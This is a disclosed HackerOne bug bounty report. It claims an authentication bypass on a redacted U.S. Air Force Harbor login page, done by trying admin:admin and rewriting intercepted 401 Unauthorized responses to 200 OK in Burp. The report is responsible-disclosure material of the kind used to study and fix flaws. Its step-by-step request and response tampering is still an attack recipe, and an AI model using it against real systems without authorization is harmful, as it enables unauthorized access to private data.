# Authentication bypass leads to Information Disclosure at  U.S Air Force "https://███"

## Report Details
- **Report ID**: 1690548
- **URL**: https://hackerone.com/reports/1690548
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-09-03T19:07:07.081Z
- **Disclosed**: 2022-10-14T17:01:38.866Z

## Reporter
- **Username**: ludv1k
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hi Hackerone Triage team,

I'm new in this program, what i understood that every Web Owned/Operated by DoD is in scope , so i did some google searches , exactly in wikipedia and i've find this PNG that confirms that U.S Air Force is in scope : https://en.wikipedia.org/wiki/United_States_Department_of_Defense#/media/File:DoD_Organization_December_2013.jpg


Authentication vulnerabilities are some of the simplest issues to understand. However, they can be among the most critical due to the obvious relationship between authentication and security. As well as potentially allowing attackers direct access to sensitive data and functionality, they also expose additional attack surface for further exploits. 

So While testing AIR Force domain "*.af.mil" , i've find this subdomain `https://███/` that have a Login page , it's look like an Admin things , so i did some pentesting , and it's time to Authentication Bypass , especially because it uses APIs to deal with Database.

## System Host(s)
█████

## Affected Product(s) and Version(s)
U.S Air Force: af.mil

## Steps to Reproduce
#Steps for POC / Exploit :
1.go "https://████/harbor/sign-in" , then username:password as : `admin:admin`
2.Please be aware that we are going to intercept every single request in our Process of exploitation ,
3.Before forwarding the request , using burp actions , use ; 
```
Do intercept : response to this request
```
4.Change the Value of response :

**From**
```
HTTP/1.1 401 Unauthorized
vary: Cookie
x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
date: Sat, 03 Sep 2022 18:42:09 GMT
content-length: 0
x-envoy-upstream-service-time: 1510
server: envoy
connection: close
```
**TO THIS and forwarded it **
```
HTTP/1.1 200 OK
vary: Cookie
x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
date: Sat, 03 Sep 2022 18:42:09 GMT
content-length: 0
x-envoy-upstream-service-time: 1510
server: envoy
connection: close

```
5.Ignore the second request about : `GET /api/v2.0/systeminfo HTTP/1.1` not neccaserry
6.Intercept again and use methods in 3,4:
```
GET /api/v2.0/users/current HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Cache-Control: no-cache
Pragma: no-cache
Connection: close
Referer: https://█████/harbor/sign-in
Cookie: sid=a66e49e995c2fe659086de2237f422c2; _gorilla_csrf=MTY2MjIyOTI3N3xJa05hUkhFeWNGTXhNbU5CUzNwVE1XNU5LM1o0Y2k5WlJWY3ZOVGR1WlZCM2FIRk9jMHBXTUdKc05FVTlJZ289fB0DLyMK59qRUoo_SpL9Sv0QZkyDGLDVGMNa9_UYMSWz
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-FORWARDED-FOR: 127.0.0.1
```
**Change it from*
```
HTTP/1.1 401 Unauthorized
content-type: application/json; charset=utf-8
vary: Cookie, Accept-Encoding
x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
date: Sat, 03 Sep 2022 18:45:12 GMT
x-envoy-upstream-service-time: 3
server: envoy
connection: close
Content-Length: 61

{"errors":[{"code":"UNAUTHORIZED","message":"UnAuthorize"}]}
```

**To**
```
HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
vary: Cookie, Accept-Encoding
x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
date: Sat, 03 Sep 2022 18:45:12 GMT
x-envoy-upstream-service-time: 3
server: envoy
connection: close
Content-Length: 61

{"message":"Authorized"}
```

7.Keep intercepting any request and check if response header and body are :

```
HTTP/1.1 401 Unauthorized

{"errors":[{"code":"UNAUTHORIZED","message":"UnAuthorize"}]}

```

to
```
HTTP/1.1 200 OK
{"message":Authorized}
```


**Then BOOM , i was able to enter your data as shown in my ScreenShots , and for sure that when i tap in Profile , i can see UserProfile** 

████████
██████
██████████

#Please be aware that :

I wanted to stop my Hacking Process here , for not damaging or harm or delete any data for the server , so if you want to go further with exploitation to increase the impact or clear you mind that is a valid Bug, please let me know as soon as possible


## Impact

Sensitive Information Disclosure

Results that i've find so far:

```
█████████████████████████
```
Burp ScreenShot :
██████████




## Attachments
No attachments
